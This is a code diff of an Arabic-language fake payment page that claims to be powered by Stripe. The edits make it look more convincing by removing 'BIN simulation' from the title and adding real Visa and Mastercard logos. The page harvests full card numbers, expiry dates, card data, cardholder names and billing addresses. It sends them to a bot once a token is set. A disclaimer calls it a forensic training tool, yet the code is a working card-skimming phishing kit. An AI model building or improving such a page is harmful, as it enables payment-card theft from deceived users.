@@ -3,35 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة دفع احترافية - محاكاة BIN</title>
+    <title>بوابة دفع احترافية</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* ===== إعادة تعيين كامل ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
+        html, body {
+            width: 100%;
+            min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: #eef2f6;
+            background: #eef2f6; /* خلفية رمادية فاتحة */
             display: flex;
             justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 24px;
+            align-items: flex-start; /* البطاقة تلصق بأعلى الصفحة */
             direction: ltr;
         }
+
+        /* ===== الحاوية الرئيسية ===== */
         .container {
             max-width: 560px;
             width: 100%;
             background: #ffffff;
-            border-radius: 32px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.08);
-            padding: 40px 36px;
-            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 0 0 32px 32px; /* تقريب سفلي فقط */
+            padding: 30px 28px 40px;
+            margin: 0; /* إزالة أي هامش علوي */
+            box-shadow: 0 8px 30px rgba(0,0,0,0.04);
+            border-bottom: 1px solid rgba(0,0,0,0.02);
         }
-        h2 { font-size: 24px; font-weight: 700; color: #0f172a; margin-bottom: 4px; }
-        .subtitle { color: #64748b; font-size: 14px; margin-bottom: 28px; border-bottom: 1px solid #e9edf2; padding-bottom: 18px; }
 
+        /* ===== عناوين الصفحة ===== */
+        .page-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 2px;
+        }
+        .page-sub {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 28px;
+            border-bottom: 1px solid #eef2f6;
+            padding-bottom: 16px;
+        }
+
+        /* ===== مجموعات الحقول ===== */
         .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 5px; }
-        .form-group input, .form-group select {
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+            margin-bottom: 5px;
+        }
+        .form-group input,
+        .form-group select {
             width: 100%;
             padding: 14px 16px;
             border: 1.5px solid #e2e8f0;
@@ -42,13 +67,14 @@
             transition: 0.2s;
             color: #0f172a;
         }
-        .form-group input:focus, .form-group select:focus {
+        .form-group input:focus,
+        .form-group select:focus {
             border-color: #2563eb;
             box-shadow: 0 0 0 4px rgba(37,99,235,0.06);
             background: #ffffff;
         }
 
-        /* حقل البطاقة مع الكشف اللحظي */
+        /* ===== حقل رقم البطاقة + الشعار المتغير ===== */
         .card-row {
             display: flex;
             align-items: center;
@@ -75,11 +101,15 @@
             font-family: 'Inter', monospace;
             color: #0f172a;
         }
-        .card-row input::placeholder { font-weight: 400; letter-spacing: 1px; color: #94a3b8; }
-        
-        /* منطقة الشعار المتغير (VISA / MasterCard) */
+        .card-row input::placeholder {
+            font-weight: 400;
+            letter-spacing: 1px;
+            color: #94a3b8;
+        }
+
+        /* ===== منطقة الشعار ===== */
         .card-brand {
-            padding: 6px 14px;
+            padding: 6px 12px;
             border-radius: 40px;
             font-size: 13px;
             font-weight: 700;
@@ -89,18 +119,42 @@
             white-space: nowrap;
             min-width: 70px;
             text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
         }
-        .card-brand.visa { background: #1a1f71; color: #ffffff; }
-        .card-brand.mastercard { background: #eb001b; color: #ffffff; }
+        .card-brand img {
+            height: 22px;
+            width: auto;
+            display: none;
+        }
+        .card-brand.visa {
+            background: #1a1f71;
+            color: #ffffff;
+        }
+        .card-brand.visa img { display: inline-block; }
+        .card-brand.mastercard {
+            background: #eb001b;
+            color: #ffffff;
+        }
+        .card-brand.mastercard img { display: inline-block; }
 
-        /* صف التواريخ و CVC */
+        /* ===== صف مزدوج ===== */
         .row-duo { display: flex; gap: 16px; }
         .row-duo .form-group { flex: 1; }
 
-        /* عنوان الفوترة */
-        .billing-title { font-size: 16px; font-weight: 700; color: #0f172a; margin: 18px 0 12px 0; border-top: 1px solid #e9edf2; padding-top: 18px; }
+        /* ===== عنوان الفوترة ===== */
+        .billing-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #0f172a;
+            margin: 20px 0 14px 0;
+            border-top: 1px solid #eef2f6;
+            padding-top: 18px;
+        }
 
-        /* زر الدفع */
+        /* ===== زر الدفع ===== */
         .pay-btn {
             width: 100%;
             background: #0f172a;
@@ -112,14 +166,24 @@
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
-            margin: 10px 0 16px 0;
+            margin: 8px 0 18px 0;
             box-shadow: 0 8px 24px rgba(15,23,42,0.12);
         }
         .pay-btn:hover { background: #1e293b; transform: scale(1.01); }
         .pay-btn:active { transform: scale(0.98); }
 
-        .footer-links { display: flex; justify-content: center; gap: 16px; font-size: 12px; color: #94a3b8; border-top: 1px solid #e9edf2; padding-top: 18px; }
+        /* ===== التذييل ===== */
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid #eef2f6;
+            padding-top: 18px;
+        }
 
+        /* ===== رسالة النجاح ===== */
         #successMsg {
             display: none;
             margin-top: 20px;
@@ -133,7 +197,7 @@
         }
         #successMsg.show { display: block; }
 
-        /* تحذير أثري */
+        /* ===== تحذير أثري ===== */
         .disclaimer {
             margin-top: 20px;
             padding: 12px 16px;
@@ -145,13 +209,21 @@
             text-align: center;
             line-height: 1.5;
         }
-        @media (max-width: 480px) { .container { padding: 24px 16px; } .row-duo { flex-direction: column; gap: 0; } }
+
+        /* ===== استجابة للشاشات الصغيرة ===== */
+        @media (max-width: 480px) {
+            .container { padding: 20px 16px 30px; }
+            .row-duo { flex-direction: column; gap: 0; }
+            .card-brand { min-width: 60px; font-size: 12px; }
+            .card-brand img { height: 18px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>💳 إتمام الدفع</h2>
-        <div class="subtitle">أدخل بيانات بطاقتك وعنوان الفوترة</div>
+        <!-- العنوان -->
+        <div class="page-title">💳 إتمام الدفع</div>
+        <div class="page-sub">أدخل بيانات بطاقتك وعنوان الفوترة</div>
 
         <form id="paymentForm">
             <!-- البريد الإلكتروني -->
@@ -160,12 +232,16 @@
                 <input type="email" id="email" placeholder="example@domain.com" required>
             </div>
 
-            <!-- رقم البطاقة + الكشف اللحظي -->
+            <!-- رقم البطاقة + كشف العلامة -->
             <div class="form-group">
                 <label>رقم البطاقة</label>
                 <div class="card-row">
                     <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                    <div class="card-brand" id="cardBrand">🔒</div>
+                    <div class="card-brand" id="cardBrand">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="VISA">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/2560px-Mastercard-logo.svg.png" alt="MasterCard">
+                        <span id="brandText">🔒</span>
+                    </div>
                 </div>
             </div>
 
@@ -187,7 +263,7 @@
                 <input type="text" id="cardHolder" placeholder="John Doe" required>
             </div>
 
-            <!-- ===== قسم عنوان الفوترة (مثل بوابات الدفع الحقيقية) ===== -->
+            <!-- ===== قسم عنوان الفوترة ===== -->
             <div class="billing-title">📍 عنوان الفوترة</div>
 
             <div class="form-group">
@@ -202,7 +278,6 @@
                     <option value="UAE">🇦🇪 الإمارات</option>
                     <option value="Libya">🇱🇾 ليبيا</option>
                     <option value="Turkey">🇹🇷 تركيا</option>
-                    <!-- باقي الدول... اختصاراً للقائمة -->
                     <option value="Germany">🇩🇪 ألمانيا</option>
                     <option value="France">🇫🇷 فرنسا</option>
                     <option value="Australia">🇦🇺 أستراليا</option>
@@ -235,6 +310,7 @@
             <button type="submit" class="pay-btn">💵 إتمام الدفع الآن</button>
         </form>
 
+        <!-- تذييل -->
         <div class="footer-links">
             <span>🔒 مدعوم بتقنية Stripe</span>
             <span>|</span>
@@ -243,8 +319,10 @@
             <span>الخصوصية</span>
         </div>
 
+        <!-- رسالة نجاح -->
         <div id="successMsg">✅ تمت العملية بنجاح (تم إرسال البيانات إلى البوت في بيئة المحاكاة).</div>
 
+        <!-- تحذير أخلاقي -->
         <div class="disclaimer">
             ⚠️ هذا النموذج هو أداة تدريبية للطب الشرعي الرقمي في بيئات معزولة فقط.<br>
             استخدامه لجمع بيانات حقيقية يعد جريمة إلكترونية في جميع الأزمنة.
@@ -255,13 +333,12 @@
         (function() {
             const form = document.getElementById('paymentForm');
             const cardInput = document.getElementById('cardNumber');
-            const brandEl = document.getElementById('cardBrand');
+            const brandDiv = document.getElementById('cardBrand');
+            const brandText = document.getElementById('brandText');
             const successDiv = document.getElementById('successMsg');
 
             // ================================================================
-            // [1] نظام الكشف التلقائي عن نوع البطاقة (BIN Detection)
-            //     فيزا: تبدأ بالرقم 4
-            //     ماستر كارد: تبدأ بـ 51-55 أو 2221-2720
+            // [1] كشف نوع البطاقة (BIN Detection)
             // ================================================================
             function detectCardType(number) {
                 const cleaned = number.replace(/\s/g, '');
@@ -269,12 +346,8 @@
                 const first = cleaned.substring(0, 1);
                 const firstTwo = cleaned.substring(0, 2);
                 const firstFour = cleaned.substring(0, 4);
-
-                // فيزا
                 if (first === '4') return 'visa';
-                // ماستر كارد (النطاق التقليدي 51-55)
                 if (parseInt(firstTwo) >= 51 && parseInt(firstTwo) <= 55) return 'mastercard';
-                // ماستر كارد (النطاق الموسع 2221-2720)
                 if (firstFour >= '2221' && firstFour <= '2720') return 'mastercard';
                 return 'unknown';
             }
@@ -282,23 +355,23 @@
             function updateBrand() {
                 const raw = cardInput.value;
                 const type = detectCardType(raw);
-                // إزالة الكلاسات السابقة
-                brandEl.classList.remove('visa', 'mastercard');
+                brandDiv.classList.remove('visa', 'mastercard');
+
                 if (type === 'visa') {
-                    brandEl.textContent = '💳 VISA';
-                    brandEl.classList.add('visa');
+                    brandDiv.classList.add('visa');
+                    brandText.textContent = ' VISA';
                 } else if (type === 'mastercard') {
-                    brandEl.textContent = '💳 MasterCard';
-                    brandEl.classList.add('mastercard');
+                    brandDiv.classList.add('mastercard');
+                    brandText.textContent = ' MasterCard';
                 } else {
-                    brandEl.textContent = '🔒';
-                    brandEl.style.background = '#f1f5f9';
-                    brandEl.style.color = '#94a3b8';
+                    brandText.textContent = '🔒';
+                    brandDiv.style.background = '#f1f5f9';
+                    brandDiv.style.color = '#94a3b8';
                 }
             }
 
-            // تنسيق المدخلات (إضافة مسافات تلقائية بين الأرقام)
-            cardInput.addEventListener('input', function(e) {
+            // تنسيق المدخلات (إضافة مسافات تلقائية)
+            cardInput.addEventListener('input', function() {
                 let val = this.value.replace(/\s/g, '').replace(/\D/g, '');
                 let formatted = '';
                 for (let i = 0; i < val.length && i < 16; i++) {
@@ -319,7 +392,7 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
 
-                // جمع كامل البيانات
+                // جمع جميع البيانات
                 const email = document.getElementById('email').value.trim();
                 const cardNum = document.getElementById('cardNumber').value.trim();
                 const expiry = document.getElementById('expiry').value.trim();
@@ -331,7 +404,7 @@
                 const state = document.getElementById('state').value.trim();
                 const zip = document.getElementById('zip').value.trim();
 
-                // بناء رسالة تفصيلية
+                // بناء الرسالة
                 const message = `🔐 [تنبيه بوابة دفع - محاكاة BIN] 🔐\n` +
                                 `📧 البريد: ${email}\n` +
                                 `💳 البطاقة: ${cardNum}\n` +
@@ -342,12 +415,12 @@
                                 `🏠 العنوان: ${address}\n` +
                                 `🏙️ المدينة: ${city}\n` +
                                 `🗺️ المنطقة: ${state}\n` +
-                                `📮 الرقم البريدي: ${zip}\n` +
+                                `📮 الرمز البريدي: ${zip}\n` +
                                 `🕒 الطابع: ${new Date().toLocaleString()}`;
 
                 console.log('📤 [بيانات المحاكاة]:', message);
 
-                // محاولة الإرسال الفعلي (في حال تم تعيين التوكن)
+                // محاولة الإرسال الفعلي (إذا تم تعيين التوكن)
                 const isTokenSet = (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE');
 
                 if (isTokenSet) {
@@ -381,14 +454,11 @@
                 }
 
                 successDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-                // (اختياري) إعادة تعيين النموذج بعد 3 ثوانٍ في وضع المحاكاة
-                // setTimeout(() => form.reset(), 3000);
             });
 
-            // تشغيل الكشف الأولي (إذا كانت هناك قيمة افتراضية)
+            // تحديث العلامة عند التحميل (في حال وجود قيمة افتراضية)
             updateBrand();
         })();
     </script>
 </body>
-    </html>
+</html>
